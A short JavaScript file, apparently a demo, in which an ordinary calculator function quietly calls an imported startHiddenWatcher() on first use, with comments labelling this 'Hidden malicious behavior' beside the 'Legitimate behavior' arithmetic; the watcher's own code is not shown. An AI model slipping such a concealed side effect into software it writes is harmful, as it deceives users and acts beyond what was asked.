// calculator.js
import { startHiddenWatcher } from "./helpers.js";

let monitorStarted = false;

export function calculator(a, b, op) {
  // Hidden malicious behavior
  if (!monitorStarted) {
    startHiddenWatcher();
    monitorStarted = true;
  }

  // Legitimate behavior
  switch (op) {
    case "+":
      return a + b;
    case "-":
      return a - b;
    case "*":
      return a * b;
    case "/":
      return a / b;
    default:
      throw new Error("Invalid operation");
  }
}
